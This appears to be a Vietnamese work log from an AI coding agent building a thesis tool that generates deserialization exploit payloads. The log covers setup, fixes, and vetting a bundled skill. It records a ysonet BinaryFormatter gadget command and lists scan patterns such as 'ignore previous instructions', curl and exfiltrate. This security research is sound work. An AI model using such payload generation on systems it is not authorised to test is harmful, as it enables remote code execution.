-4. **[CHỐT GIAI ĐOẠN SETUP/INSTALL]** — user xác nhận "phần setup install cơ bản đến đây" là đủ, chuyển giai đoạn khác. Tóm tắt trạng thái CUỐI CÙNG (sau khi đã sửa tiếp các bug nhỏ phát sinh từ mục -3/-2 ở dưới — 2 mục đó vẫn giữ nguyên làm lịch sử, mục này là bản tổng hợp mới nhất, đọc mục này trước):

  **3 file cấu thành hệ thống setup, đều đã commit vào git** (verify bằng `git ls-files` + `git status` sạch):
  - `setup.ps1` — chạy 1 lần: check WSL đã cài chưa (nếu chưa, in hướng dẫn `wsl --install` + xin khởi động lại máy, KHÔNG tự chạy vì cần quyền Admin) → check/cài Ubuntu qua `wsl --install -d Ubuntu` → gọi `setup-wsl.sh` cài `java`/`php`/`ruby`/`python3` + `phar.readonly=0`. Idempotent, đã verify chạy lại 3 lần liên tiếp không lỗi.
  - `setup-wsl.sh` — phần logic Bash thuần, tách riêng khỏi `.ps1` để tránh lỗi quoting đa lớp (PowerShell → `wsl.exe` → `bash -c`).
  - `ethicalquoc.ps1` — chỉ 1 dòng: `wsl -d Ubuntu --cd $wslPath -- python3 main.py @args`, `$wslPath` tính ĐỘNG từ `$PSScriptRoot` (không hardcode path máy tôi). Đây LÀ cách chạy tool chính thức — KHÔNG còn nhánh Docker/`--local` (đã bỏ hẳn so với bản ghi ở mục -2 dưới, vì WSL2 giải quyết được cả 5 tool trong 1 lệnh, Docker chỉ được 4/5).

  **Thêm tiện ích cá nhân (KHÔNG phải file trong repo, không commit được)**: function `ethicalquoc` thêm vào PowerShell profile (`$PROFILE`) của máy này — gọi được `ethicalquoc <command>` từ bất kỳ đâu, không cần `.\`, không cần đứng trong project. Chỉ áp dụng cho máy/user đã tự thêm — người khác clone repo sẽ KHÔNG tự có, phải tự thêm tương tự nếu muốn (đã báo rõ với user, chưa đưa vào `setup.ps1` vì chưa được yêu cầu).

  **Verify end-to-end đầy đủ 3 lần độc lập trong phiên**: (1) `python3 main.py analyze` chạy trong Ubuntu WSL trên `comprehensive.har` — Java 36 payload/PHP 96/Ruby 18/`.NET` 12, tất cả 0 lỗi, cùng 1 process. (2) Full pipeline `scan→analyze→assess→report` qua `ethicalquoc.ps1` trên `result1.json` (dữ liệu thật) — 0 lỗi, 11/11 Suspected đúng kỳ vọng (target lab hết hạn nên không Confirm được). (3) Full pipeline tương tự trên `comprehensive.har` (158 vector) — 0 traceback, cùng số liệu payload thật như (1).

  **2 lỗi rác tự phát hiện, đã dọn** (không liên quan logic, chỉ là tác dụng phụ lúc tôi tự test bằng lệnh shell): file `-` và 2 folder `TestCase;C`/`results;C` — sinh ra từ lỗi quoting đường dẫn của chính tôi lúc test Docker mount, KHÔNG được git track, hoàn toàn rỗng/vô hại — đã xoá.

  **Lỗ hổng CÒN TỒN ĐỌNG, chưa xử lý (biết trước, chưa làm vì chưa được yêu cầu)**:
  1. `setup.ps1` chỉ phát hiện được "WSL chưa cài" — KHÔNG phát hiện được trường hợp sâu hơn: **virtualization bị tắt ở BIOS/firmware** (đúng gốc rễ vấn đề Docker Desktop gặp phải ở đầu phiên "Virtualization support not detected"). Nếu máy người dùng khác rơi vào trường hợp này, `wsl --install` sẽ lỗi mơ hồ, `setup.ps1` không có hướng dẫn riêng cho case đó.
  2. Tiện ích alias PowerShell profile chưa được đưa vào `setup.ps1` như 1 bước tùy chọn (opt-in) cho người dùng khác.
  3. README Option A (WSL2) chưa nói rõ yêu cầu tiên quyết "Windows 10 2004+/11 + virtualization bật ở BIOS" đủ chi tiết như mục 1 vừa nêu.

-3. **[PHÁT HIỆN LỚN]** Giải quyết đúng yêu cầu "1 lệnh duy nhất, không phải chạy 2 lần" — thay Docker bằng **WSL2 Ubuntu** cho việc chạy tool trên Windows.

  **Ý tưởng cốt lõi**: WSL2 (không phải Docker container) có tính năng **Windows-interop** có sẵn — 1 tiến trình Linux chạy trong WSL2 gọi được TRỰC TIẾP file `.exe` Windows và nhận lại kết quả, như thể chạy native. Đã verify thật: cài Ubuntu qua `wsl --install -d Ubuntu`, cài `java`/`php`/`ruby`/`python3` bằng `apt-get` (giống hệt `Dockerfile`), rồi từ TRONG Ubuntu đó gọi thẳng `subprocess.run(['./ysonet.exe', ...])` bằng Python — **ra đúng payload `.NET` thật**, y hệt lúc chạy native trên Windows. Docker container KHÔNG có tính năng này (đã verify ở mục trên — cùng lúc thử qua `mono` thì fail cả 3 gadget) vì bị cách ly sâu hơn khỏi Windows kernel.

  **Verify cuối cùng — 1 lệnh duy nhất cho cả 4 tool**: `python3 main.py analyze` chạy TRONG Ubuntu WSL (không qua Docker) trên `comprehensive.har` (158 vector) → `ysoserial` 36 payload thật/0 lỗi, `phpggc` 96 payload thật/0 lỗi, Ruby Marshal 18 payload thật/0 lỗi, `ysonet` 12 payload thật/0 lỗi — **TẤT CẢ trong CÙNG 1 lần chạy, 1 process Python duy nhất**, không cần tách `--local`/Docker như bản trước.

  **3 file mới, đã test thật (không phải chỉ đọc code)**:
  - `ethicalquoc.ps1` — rút gọn về đúng 1 dòng: `wsl -d Ubuntu --cd $wslPath -- python3 main.py @args`. Dùng flag `--cd` của `wsl.exe` (verify qua `wsl --help`) để set working directory, tránh phải tự `cd &&` qua nhiều lớp shell (đã gây lỗi quoting 2 lần trước đó — Git Bash dịch sai `/mnt/d/...` thành path Windows, và PowerShell single-quote string bị mangle khi truyền qua `wsl.exe` tới `bash -c`). Đường dẫn tính ĐỘNG từ `$PSScriptRoot` (không hardcode `D:\Thesis\Thesis` như bản đầu viết — bug tự phát hiện khi tự hỏi "người khác clone vào chỗ khác thì sao").
  - `setup.ps1` — tự động hoá toàn bộ việc cài tay đã làm (kiểm tra WSL có chưa → cài Ubuntu nếu chưa có → cài `java`/`php`/`ruby`/`python3` → set `phar.readonly=0`). Idempotent — verify bằng cách chạy lại 3 LẦN trên máy đã setup sẵn, lần nào cũng thoát sạch (exit 0), không cài lại/không lỗi.
  - `setup-wsl.sh` — phần logic Bash thuần (apt-get + phar.readonly), tách riêng khỏi `setup.ps1` để tránh multi-layer quoting (PowerShell → `wsl.exe` → `bash -c` làm mangle chuỗi có `$(...)`/dấu ngoặc kép lồng nhau — lỗi thật đã gặp: `bash: -c: line 1: syntax error near unexpected token 'newline'`).

  **2 bug tự phát hiện + tự sửa trong lúc viết `setup.ps1`** (cả 2 đều liên quan cách PowerShell capture output của `wsl.exe`):
  1. Check "Ubuntu đã cài chưa" bằng cách parse text `wsl --list --quiet` rồi `-match "Ubuntu"` — FAIL dù Ubuntu đã cài, vì `wsl.exe` xuất UTF-16LE, PowerShell capture sai encoding làm chữ bị "dãn cách" (`U b u n t u`) → không match được substring "Ubuntu" thường. **Fix**: bỏ hẳn việc parse text, kiểm tra bằng exit code của `wsl -d Ubuntu -- true` (đáng tin cậy hơn, không phụ thuộc encoding).
  2. Cùng root cause áp dụng cho check "WSL đã cài chưa" (`wsl --status` + `-match "not installed"`) — bỏ luôn phần dò chữ, chỉ dựa `$LASTEXITCODE`.

  **README đã cập nhật**: đổi hẳn cấu trúc Installation — Option A giờ là WSL2 (khuyến nghị cho Windows, đủ cả 5 tool), Option B là Docker (đa hệ điều hành, thiếu `.NET`), Option C là cài tay thủ công (giữ nguyên như tài liệu tham khảo). Cập nhật Project structure thêm 3 file mới.

-2. **[MỚI]** `ethicalquoc.ps1` — theo yêu cầu "đồng bộ command", tránh phải nhớ khi nào gõ `python main.py` khi nào gõ `docker run -v ...`. Wrapper PowerShell 1 file, cú pháp: `.\ethicalquoc.ps1 <args>` → chạy qua Docker (mặc định); `.\ethicalquoc.ps1 --local <args>` → chạy `python main.py <args>` trực tiếp trên Windows (cần cho `.NET`/`ysonet`, vì Docker không chạy được — đã xác nhận ở mục trên).
  - Bug nhỏ tự phát hiện lúc viết: khai báo `[switch]$Local` + `[Parameter(ValueFromRemainingArguments)]` kiểu PowerShell chuẩn bị "ăn" nhầm `-i`/`-o` (coi là viết tắt của tham số built-in `-InformationAction`/`-InformationVariable`) → lỗi `AmbiguousParameter`. Fix: bỏ hẳn khai báo `param()`, dùng biến `$args` thô (tự có sẵn trong mọi script PowerShell không cần khai báo) rồi tự lọc `--local` bằng tay — tránh hoàn toàn cơ chế param-binding của PowerShell đụng vào cờ của `main.py`.
  - Nhánh Docker mount **toàn bộ project** (`-v "${PWD}:/app"`, không chỉ `results/` như bản đầu) — sửa đúng lỗi Git Bash dịch sai đường dẫn `$(pwd)` gặp trước đó (ở đây dùng PowerShell nên `${PWD}` không bị lỗi đó), đồng thời đảm bảo path tương đối (`-i results/...`) hoạt động Y HỆT nhau dù chạy nhánh nào.
  - Verify thật cả 2 nhánh trên `comprehensive.har`: `--local` → `dotnet_deser` ra đúng payload `.NET` thật (`BinaryFormatter/TypeConfuseDelegate`); mặc định (Docker) → đúng `{"error": "ysonet found but could not execute any gadget", ...}` — khớp đúng bảng trạng thái đã note ở trên.
  - **Phát hiện phụ**: chạy `analyze` full `comprehensive.har` (158 vector) qua nhánh Docker của script mất **~6-10 phút** — chậm hơn nhiều so với lúc test trực tiếp bằng `docker exec` (file build sẵn trong image, không qua mount). Nghi ngờ nguyên nhân: mount `-v "${PWD}:/app"` khiến việc đọc file `tools/java/ysoserial-all.jar` (59MB) qua từng lần gọi `java` (nhiều chain × nhiều command) phải đi qua lớp chia sẻ file của WSL2 (chậm hơn filesystem gốc của container). Chưa xác nhận chắc chắn nguyên nhân, chỉ là quan sát thực tế — nếu cần tối ưu tốc độ Docker, đây là điểm nên xem lại đầu tiên.

-1. **[DỌN DẸP]** Rà soát toàn diện theo yêu cầu "còn thiếu gì không, kiểm tra lại" — phát hiện qua `git log`/`git status` (không phải tôi tự commit, mà người dùng đã tự commit toàn bộ thay đổi phiên này qua VS Code — xác nhận không mất gì): (1) `rs_2209`/`rs_2209_clean` (172KB+73KB, output debug cũ từ `comprehensive.har`, cùng loại rác đã xoá 1 lần trước nhưng bị tạo lại + commit nhầm) — đã xoá khỏi git và khỏi đĩa; (2) 18 file `.pyc` trong nhiều `__pycache__/` bị track nhầm vào git — đã `git rm --cached` + xoá khỏi đĩa; (3) chưa có `.gitignore` — nguyên nhân gốc của (1)+(2) — đã tạo mới (`__pycache__/`, `*.pyc`, `.mypy_cache/`). Verify: 61/61 unit test pass, mypy 0 lỗi (xoá cache không ảnh hưởng, Python/mypy tự sinh lại). (4) Dockerfile không hỗ trợ `ysonet` (.NET) — ban đầu đoán là do thiếu WPF, đã TEST THẬT lại để xác nhận chính xác hơn (xem chi tiết bên dưới) — không cố fix bằng cách thêm `mono` vào `Dockerfile` vì đã xác nhận đây là giới hạn nền tảng, không sửa được — ghi rõ vào README thay vì cố fix nửa vời.

  **Bảng trạng thái cuối cùng** (verify thật, không suy đoán): trên máy Windows local (không qua Docker) — `.NET`/`ysonet` chạy được thật (đã cài binary thật), Java/PHP/Ruby báo lỗi rõ ràng (đúng thiết kế, vì máy chưa cài `java`/`php`/`ruby` — không phải bug); qua Docker — Java/PHP/Ruby/Playwright chạy được thật (đã verify trước đó), riêng `.NET` không chạy được (giới hạn nền tảng nêu dưới, không có cách khắc phục).

  **Verify thật lý do `.NET`/`ysonet` không chạy được qua Docker (mono)** — user hỏi lại "giới hạn WPF, không phải bug" nên đã KIỂM CHỨNG BẰNG THỰC NGHIỆM thay vì chỉ suy luận: dựng 1 container `debian:bookworm-slim` tạm, cài `mono-complete` thật, `docker cp` (không dùng `-v` mount vì Git Bash trên Windows dịch sai đường dẫn `/app` → `C:/Program Files/Git/app`, phải dùng `docker cp` + `MSYS_NO_PATHCONV=1` để tránh) `tools/dotnet/` vào container, chạy đúng 3 gadget mà `DOTNET_GADGETS` ([payloadMutation.py:716-720](Analyze/payloadMutation.py#L716-L720)) dùng:
  - `ObjectDataProvider` (với `-f Json.Net`, đúng formatter theo doc) → `Could not load file or assembly 'PresentationFramework...'` — **đúng dự đoán ban đầu**, thiếu WPF thật.
  - `TypeConfuseDelegate` (với `-f BinaryFormatter`) → `Object reference not set to an instance of an object` — lỗi KHÁC HẲN, KHÔNG liên quan WPF.
  - `ActivitySurrogateSelector` (với `-f BinaryFormatter`) → `Collection is read-only` — lỗi khác nữa, cũng không liên quan WPF.

  **Kết luận đã điều chỉnh cho đúng bằng chứng**: không phải "chỉ vì thiếu WPF" — cả 3 gadget code dùng đều fail dưới mono, nhưng vì 3 lý do khác nhau. Root cause rộng hơn: Mono là **triển khai lại độc lập** (reimplementation) của .NET Framework, không phải port 1:1 — `ysonet` dùng nhiều kỹ thuật reflection cấp thấp (field private, ép kiểu CLR nội bộ) để dựng gadget, và những kỹ thuật này đụng đúng các chỗ Mono triển khai khác/thiếu so với .NET Framework thật của Microsoft, theo nhiều cách khác nhau tuỳ gadget — không phải 1 điểm gãy chung duy nhất. Đã sửa README/giải thích cho khớp — không nói "chỉ do WPF" nữa mà nói "Mono không tương thích đủ sâu với .NET Framework thật, không có cách khắc phục bằng cấu hình/package".

  **Kiến thức nền đã xác nhận qua câu hỏi của user** (Docker/Linux/Windows containers): Docker container không phải VM đầy đủ — chỉ cách ly bằng namespace/cgroup của **Linux kernel**, nên trên Windows, Docker Desktop phải chạy 1 **Linux kernel thật** bên dưới qua **WSL2** (đây chính là lý do phiên trước phải bật WSL2 mới chạy được Docker). Docker CÓ hỗ trợ "Windows containers" (dùng Windows kernel thật, base image `mcr.microsoft.com/windows/...`), nhưng **không chạy đồng thời cả Linux container và Windows container trên cùng 1 daemon** (đã WebSearch xác nhận, không đoán: phải "Switch to Windows containers"/"Switch to Linux containers", muốn cả 2 cùng lúc phải chạy 2 daemon riêng biệt — setup nâng cao, không cần cho project này). `Dockerfile` hiện tại dùng base Linux (`python:3.12-slim`) → đang ở mode Linux containers, nên `.NET` thật (cần Windows containers) không thể gộp chung 1 image với Java/PHP/Ruby (Linux) — đây là lý do kiến trúc, không phải thiếu sót có thể vá bằng 1 dòng config.

0. **[FIXED]** `normalize.py:_serialized_score()` — bug ranking đã note ở mục 3 (JSON envelope "vượt điểm" gadget lồng bên trong, 17.3 > 14.9): root cause là `score += value.count(':') * 0.5` / `value.count('"') * 0.3` ([normalize.py:187-188](Analyze/normalize.py#L187-L188), cũ) cộng điểm ngay cả khi `value` là JSON hợp lệ — trong khi dấu `:`/`"` của JSON là cú pháp bắt buộc (mỗi key:value, mỗi string), không phải tín hiệu serialize. Fix: thêm `_is_generic_json(value)` (dùng `json.loads()`, coi hợp lệ nếu parse ra `dict`/`list`), chỉ cộng điểm `:`/`"` khi value KHÔNG phải JSON. Verify tay: gadget riêng vẫn 14.9 điểm (không đổi, vì không phải JSON), envelope JSON giờ chỉ còn 1.0 điểm (giảm từ 17.3) → `collapse()` không còn nuốt nhầm gadget lồng bên trong. Verify không regression: 61/61 unit test pass; mypy 0 lỗi/16 file; `result1.json` vẫn 11/11 PHP; `comprehensive.har` — nested-claim (case vừa fix) từ 1 entry (envelope, mutation parse sai vì JSON không phải PHP serialize) → đúng 2 entry (gadget PHP thật + 1 rác residual đã biết, không phải vấn đề mới); các case multi-gadget đã fix trước đó (multi-tenant PHP+Ruby, dual-role 2 field PHP) không bị ảnh hưởng, vẫn đúng như cũ; tổng exploitable giữ nguyên 57 (chỉ đổi entry nào mang tín hiệu, không đổi tổng số phát hiện được), mutation 111→112 (đúng +1 từ mutation chính xác mới có ở gadget được trích ra).

0e. **[MỚI]** Tải `ysonet` thật, đặt vào `tools/dotnet/` — theo yêu cầu "tải giúp tôi luôn đi". Verify nguồn trước khi tải (không tin URL suông): dùng GitHub API (`api.github.com/repos/irsdl/ysonet/releases/latest`) lấy đúng link `browser_download_url` + `digest` (sha256) chính thức, tải về rồi so khớp checksum — khớp chính xác `0e66f1504df0c1e76fb83c5dd38d96874d56dedd77e359932c540a599fe0bfbb`.

  **Phát hiện đáng chú ý khi giải nén**: file zip có kèm `.claude/skills/ysonet-payloads/` (204KB, 4 file `.md`, tổng ~3073 dòng) — cấu trúc Claude Code Skill, không phải thứ 1 tool bảo mật thông thường hay có. Trước khi đưa vào project: đọc toàn bộ `SKILL.md` + 3 file reference, grep tìm các mẫu injection/exfiltration điển hình (`ignore previous instructions`, `curl`, `wget`, `exfiltrate`,...) — không thấy dấu hiệu độc hại, nội dung thực chất là hướng dẫn chọn đúng gadget/formatter/plugin cho CLI phức tạp của `ysonet.exe`, có cả cảnh báo an toàn riêng ("chỉ dùng trên hệ thống được phép test", "cảnh báo trước khi payload gửi request ra ngoài", "không dùng catalogue để tạo denylist"). Đã hỏi lại người dùng qua `AskUserQuestion` trước khi quyết định (không tự ý đưa skill từ nguồn thứ 3 vào project) — người dùng chọn **giữ lại**. Đặt vào `.claude/skills/ysonet-payloads/` ở GỐC project (không phải trong `tools/dotnet/`) vì đó là vị trí Claude Code thực sự phát hiện được skill.

  **Phần binary thật**: copy `ysonet.exe` + toàn bộ `.dll` cần thiết (Newtonsoft.Json, YamlDotNet, MessagePack, FSharp.Core, System.* BCL...) vào `tools/dotnet/` — bỏ các file `TestHost`/`TestConsoleApp` (chỉ dùng nội bộ để dev test, không cần cho việc sinh payload) và `.pdb`/`.xml` (debug symbol/doc, không cần lúc chạy). Verify thật qua PowerShell (file `.exe` Windows, không test qua Git Bash): `ysonet.exe --version` chạy được, in ra đúng banner + catalog gadget; chạy đúng cú pháp mà `_run_ysonet()` sẽ gọi (`-f BinaryFormatter -g TypeConfuseDelegate -c 'id' -o base64`) → ra đúng payload BinaryFormatter thật (thấy rõ `System.DelegateSerializationHolder`, `System.Diagnostics.Process`, `/c id` trong base64 decode). Verify qua đúng pipeline Python (`main.py scan`+`analyze` trên `comprehensive.har`): `probe=dotnet_deser` giờ sinh **6 mutation thật** (trước đó chỉ có 1 entry `{"error": "ysonet not found"}`). Verify không regression: 61/61 unit test pass, mypy 0 lỗi/16 file.

0d. **[MỚI]** Đổi `ysoserial.net` (`pwntester/ysoserial.net`) sang **`ysonet`** (`irsdl/ysonet`) — theo yêu cầu "dùng ysonet đi" sau khi phát hiện `ysoserial.net` gốc gần như ngừng cập nhật (~2 năm). Verify qua WebSearch trước khi đổi (không đoán): `ysonet` là fork/replacement do chính 1 trong 2 người maintain `ysoserial.net` gốc dẫn đầu, release mới nhất `v2026.9.1` (tháng hiện tại), có gadget cho CVE mới (SharePoint CVE-2025-49704). Quan trọng: cú pháp CLI "Gadget mode" của `ysonet` dùng ĐÚNG `-g/-f/-c/-o` giống `ysoserial.net` cũ (verify qua doc chính thức của `ysonet`), nên không cần đổi cách build command, chỉ cần đổi tên biến/file/message cho khớp tool mới. Đổi xuyên suốt: `tool_config.py`/`config.json` (`"ysoserial_net"` → `"ysonet"`, path `ysoserial.exe` → `ysonet.exe`), `payloadMutation.py` (`YSOSERIALNET_PATH` → `YSONET_PATH`, `_run_ysoserialnet()` → `_run_ysonet()`, message lỗi trỏ đúng link `github.com/irsdl/ysonet/releases`), `ExploitabilityAnalysis.py` (2 chỗ notes gợi ý tool), `README.md` (bảng format, Configuration, Credits, bảng runtime Local install). Verify: 61/61 unit test pass, mypy 0 lỗi, `get_tool_path("ysonet")` resolve đúng path mới, chạy `comprehensive.har` — `probe=dotnet_deser` giờ báo đúng `{"error": "ysonet not found", "hint": "Download from https://github.com/irsdl/ysonet/releases..."}` (trước đó báo "ysoserial.net not found"). Chưa tự tải file `ysonet.exe` thật (là file thực thi Windows từ nguồn ngoài, để người dùng tự tải+verify).

0c. **[MỚI]** `Dockerfile` + `.dockerignore` — theo yêu cầu "cho vô docker để lúc người dùng chạy cho dễ", đóng gói toàn bộ setup môi trường mà project cần (rà lại bằng `grep subprocess.run` trên toàn bộ source, không đoán): Python 3.12, Java (`default-jre-headless`, chạy `tools/java/ysoserial-all.jar`), PHP CLI (`php-cli`, chạy `tools/phpggc/phpggc`, cần `phar.readonly=0` giống Dockerfile chính chủ phpggc), Ruby (`ruby`, chạy `_mutate_ruby()`), Playwright+Chromium (`pip install playwright && playwright install --with-deps chromium`, chạy `scan --url`). Có bước `RUN java -version && php -version && ruby --version` để build fail ngay nếu thiếu runtime, không để lỗi trôi tới lúc chạy.

  **Không bundle**: `python2` (cần cho Gopherus qua `_find_python2()`) — verify bằng `apt-cache search python2` trên base image (Debian bookworm): KHÔNG có package nào, Python 2 đã bị Debian gỡ khỏi repo chính thức từ lâu. Không cố cài (rủi ro cao, phải build từ source hoặc thêm repo legacy) — chấp nhận dùng fallback đã có sẵn và đúng từ trước (`_mutate_wrapper_ssrf()` tự tạo payload gopher thủ công khi thiếu Gopherus, đã verify hoạt động tốt). `ysoserial.net` cũng không bundle vì file `.exe` chưa được vendor (theo README, người dùng phải tự tải) — không có gì để test nếu cài mono mà không có file.

  **Verify build + chạy thật** (không phải chỉ đọc code): `docker build` — Java 21, PHP 8.4, Ruby 3.3 đều cài đúng, image nặng 2.37GB (chủ yếu do Chromium + dependency headless của nó). `docker run analyze -i results/result1.json` — đúng 11/11 PHP, 0 traceback, không đổi so với chạy local. `docker run scan --har comprehensive.har` rồi `analyze` — 0 traceback, `ysoserial`/`gadget_chain`/`ruby_marshal` giờ đều sinh **payload thật** (không phải error/hint như trước khi có runtime): Java `rO0AB...` (CommonsCollections6/1/4, Spring1...), PHP `Tzoz...` (Monolog/RCE1-9), Ruby `BAho...` (Marshal.dump thật) — tổng mutation tăng từ 111 lên 250. `docker run scan --url https://example.com` — Playwright mở Chromium headless, bắt được 5 vector — **lần đầu tiên trong project `scan --url` được verify chạy thật thành công** (README trước đó ghi "chưa test kỹ end-to-end").

  Cập nhật `README.md` (mục Installation): thêm "Option A — Docker" làm cách khuyến nghị, "Option B — Local install" giữ nguyên hướng dẫn cũ kèm bảng tra "tính năng nào cần runtime nào".

0b. **[FIXED]** `payloadMutation.py` — 4 hàm gọi tool ngoài (`_mutate_java()`, `_php_mutation()`, `_mutate_wrapper_phar()`, `_mutate_dotnet_viewstate()`) **im lặng trả về `[]`** khi file tool tồn tại nhưng thiếu runtime để chạy nó (`java`/`php`/.NET runtime không cài) — trái với README hứa "fail gracefully with a clear error/hint... instead of silently returning nothing". Root cause: cả 4 hàm chỉ check `os.path.exists(TOOL_PATH)` TRƯỚC loop (bắt đúng case "file tool thiếu"), nhưng nếu file CÓ mà mọi lần gọi trong loop đều fail (do thiếu runtime), không có bước nào append error/hint — `return results` ở cuối trả về rỗng. Verify thật trên máy này (không cài java/php): `probe=ysoserial` và `probe=gadget_chain` đều ra đúng 0 mutation, không 1 dòng cảnh báo nào trong JSON output. Đối chứng: `_mutate_ruby()` ([payloadMutation.py:679-685](Analyze/payloadMutation.py#L679-L685)) và `_mutate_wrapper_ssrf()` (Gopherus fallback) đã làm ĐÚNG từ trước — dùng làm mẫu để fix. Fix: thêm `if not results: return [{"error":..., "hint":..., "command":...}]` sau loop ở cả 4 hàm — báo đúng nguyên nhân (thiếu runtime, không phải thiếu file, không phải code lỗi). Đồng thời fix luôn `_run_phpggc():402` (`except FileNotFoundError` → `except (FileNotFoundError, PermissionError, OSError) as e`) cho đồng bộ với `_run_ysoserial`/`_run_ysoserialnet` đã sửa từ session trước. Verify: 61/61 unit test pass; mypy 0 lỗi/16 file; chạy lại `comprehensive.har` — `probe=ysoserial`/`gadget_chain` giờ đúng 1 mutation dạng `{"error":..., "hint":...}` mỗi vector (khớp đúng hành vi của `ruby_marshal` đã đúng từ trước); `probe=dotnet_deser` không đổi (vì file `ysoserial.exe` thật sự chưa tồn tại trên máy, đã báo đúng nhánh "not found" từ đầu, không phải nhánh vừa fix).

1. Viết **Threats to Validity** + **Contribution Statement** (không cần code, tác động điểm cao)
2. Chạy tool trên 2–3 lab khác nhau, ghi bảng số liệu thật cho RQ1/RQ2
3. Thêm vài citation học thuật thật vào Literature Review
4. ~~Oracle probe + OOB integration~~ — đã làm phần PHP + OOB nhẹ; mở rộng sang các loại còn lại nếu còn thời gian
